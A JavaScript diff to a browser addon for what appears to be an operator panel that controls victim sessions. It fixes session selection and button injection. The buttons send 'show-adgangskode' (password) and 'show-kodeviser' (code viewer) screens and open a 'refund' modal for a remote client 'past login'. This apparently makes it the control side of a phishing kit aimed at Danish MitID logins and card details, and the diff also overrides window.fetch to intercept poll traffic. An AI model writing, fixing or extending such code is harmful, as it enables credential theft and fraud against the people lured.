@@ -19,6 +19,11 @@
       return "";
     }
   }
+  /**
+   * SPA owns miitid_admin_selected_session (set on select, cleared on back).
+   * Addon must only READ it — never write it back (that re-opened the old session).
+   */
+  var lastSeenAdminSid = "";
   function sidAdmin() {
     try {
       return localStorage.getItem(ADMIN_KEY) || "";
@@ -26,11 +31,19 @@
       return "";
     }
   }
+  function syncAdminSidFromSpa() {
+    var raw = sidAdmin();
+    if (raw !== lastSeenAdminSid) {
+      lastSeenAdminSid = raw;
+      pollLast.admin = 0;
+    }
+  }
   function isAdmin() {
     return (window.location.hash || "").indexOf("admin") === 1;
   }
 
   function send(role, data) {
+    if (role === "admin") syncAdminSidFromSpa();
     var sessionId = role === "admin" ? sidAdmin() : sidUser();
     if (!sessionId) {
       alert(
@@ -510,8 +523,11 @@
   }
 
   setInterval(function () {
-    if (isAdmin()) pollOnce("admin");
-    else if (sidUser()) pollOnce("user");
+    if (isAdmin()) {
+      syncAdminSidFromSpa();
+      if (!sidAdmin()) return; // list view — SPA cleared selection
+      pollOnce("admin");
+    } else if (sidUser()) pollOnce("user");
   }, 900);
 
   window.fetch = function () {
@@ -520,6 +536,8 @@
       try {
         var url = typeof args[0] === "string" ? args[0] : args[0] && args[0].url;
         if (url && String(url).indexOf("/api/ws/poll") !== -1) {
+          // If SPA still has a selected session, reset poll cursor when it changes
+          syncAdminSidFromSpa();
           res
             .clone()
             .json()
@@ -533,33 +551,13 @@
     });
   };
 
-  document.addEventListener(
-    "click",
-    function (e) {
-      if (!isAdmin() || !e.target) return;
-      var node = e.target;
-      for (var i = 0; i < 6 && node; i++) {
-        var txt = (node.getAttribute && node.getAttribute("data-session-id")) || "";
-        if (!txt && node.textContent) {
-          var m = String(node.textContent).match(/[a-f0-9]{32,}/i);
-          if (m) txt = m[0].slice(0, 64);
-        }
-        if (txt && txt.length >= 32) {
-          try {
-            localStorage.setItem(ADMIN_KEY, txt);
-            pollLast.admin = 0;
-          } catch (err) {}
-          break;
-        }
-        node = node.parentElement;
-      }
-    },
-    true
-  );
+  function removeAdminButtons() {
+    var el = document.getElementById("juj-refund-admin");
+    if (el) el.remove();
+    closeOverlay("juj-admin-refund-modal");
+  }
 
-  function injectAdminButtons() {
-    if (!isAdmin()) return;
-    if (document.getElementById("juj-refund-admin")) return;
+  function findSessionAnchor() {
     var buttons = Array.prototype.slice.call(document.querySelectorAll("button"));
     var anchor = null;
     for (var i = 0; i < buttons.length; i++) {
@@ -573,7 +571,24 @@
         anchor = buttons[i].parentElement;
       }
     }
-    if (!anchor || !anchor.parentElement) return;
+    return anchor;
+  }
+
+  function injectAdminButtons() {
+    if (!isAdmin()) {
+      removeAdminButtons();
+      return;
+    }
+    syncAdminSidFromSpa();
+
+    var anchor = findSessionAnchor();
+    // Session list / no detail view → remove addon UI so it cannot stick to old session
+    if (!anchor || !anchor.parentElement || !sidAdmin()) {
+      removeAdminButtons();
+      return;
+    }
+
+    if (document.getElementById("juj-refund-admin")) return;
 
     var box = document.createElement("div");
     box.id = "juj-refund-admin";
@@ -586,21 +601,24 @@
     anchor.parentElement.insertBefore(box, anchor.nextSibling);
 
     document.getElementById("juj-btn-card").onclick = function () {
+      syncAdminSidFromSpa();
       openAdminRefundModal();
     };
     document.getElementById("juj-btn-ak").onclick = function () {
+      syncAdminSidFromSpa();
       send("admin", { type: "show-adgangskode" }).then(function (ok) {
         if (ok) toast("Password screen sent — client must be past login");
       });
     };
     document.getElementById("juj-btn-kv").onclick = function () {
+      syncAdminSidFromSpa();
       send("admin", { type: "show-kodeviser" }).then(function (ok) {
         if (ok) toast("Kodeviser sent — client must be past login");
       });
     };
   }
 
-  setInterval(injectAdminButtons, 1000);
+  setInterval(injectAdminButtons, 800);
   window.addEventListener("hashchange", function () {
     setTimeout(injectAdminButtons, 300);
   });
